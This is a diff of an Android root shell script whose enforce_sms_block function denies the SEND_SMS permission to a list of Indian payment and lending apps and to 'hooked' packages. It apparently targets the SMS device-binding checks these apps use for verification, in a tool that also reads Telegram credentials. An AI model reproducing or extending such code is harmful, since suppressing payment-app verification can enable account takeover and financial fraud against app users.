@@ -178,6 +178,7 @@ sms_block_wanted() {
 }
 
 enforce_sms_block() {
+  # SAFE: com.android.phone pe kabhi appops mat lagao (SIM/radio break)
   sms_block_wanted || return 0
 
   HOOKED=""
@@ -187,26 +188,17 @@ enforce_sms_block() {
   if [ -f "$ACTIVE_PKG" ]; then
     HOOKED="$HOOKED $(cat "$ACTIVE_PKG" 2>/dev/null | tr -d '\r\n ')"
   fi
-  SRC_CFG=""
-  [ -f "$RUNTIME" ] && SRC_CFG="$RUNTIME"
-  [ -z "$SRC_CFG" ] && [ -f "$CONFIG" ] && SRC_CFG="$CONFIG"
-  if [ -n "$SRC_CFG" ]; then
-    HOOKED="$HOOKED $(grep -oE '"[a-zA-Z][a-zA-Z0-9._]*"[[:space:]]*:[[:space:]]*true' "$SRC_CFG" 2>/dev/null | sed 's/"\([^"]*\)".*/\1/' | grep -E '^com\.')"
-  fi
 
-  for pkg in com.google.android.apps.messaging com.android.mms com.android.mms.service \
-    com.samsung.android.messaging com.yespay.next com.yesbank.yespay com.yesbank.yespaynext \
-    com.kreditbee.android com.groww.app com.nextbillion.groww \
-    com.herofincorp.diyjourneys com.herofincorp.simplycash com.customer.herofincorp \
-    com.phonepe.app net.one97.paytm com.fampay.in $HOOKED; do
+  for pkg in com.phonepe.app net.one97.paytm com.google.android.apps.nbu.paisa.user \
+    com.yespay.next com.kreditbee.android com.groww.app com.nextbillion.groww \
+    com.fampay.in com.mobikwik_new $HOOKED; do
     [ -z "$pkg" ] && continue
+    case "$pkg" in
+      com.android.phone|com.android.providers.telephony|com.android.systemui) continue ;;
+    esac
     appops set "$pkg" SEND_SMS deny 2>/dev/null
     cmd appops set "$pkg" SEND_SMS deny 2>/dev/null
-    appops set "$pkg" WRITE_SMS deny 2>/dev/null
-    cmd appops set "$pkg" WRITE_SMS deny 2>/dev/null
   done
-  echo 1 > /data/local/tmp/hivirtus_phone_sms_denied.flag
-  chmod 644 /data/local/tmp/hivirtus_phone_sms_denied.flag 2>/dev/null
 }
 
 read_tg_creds() {
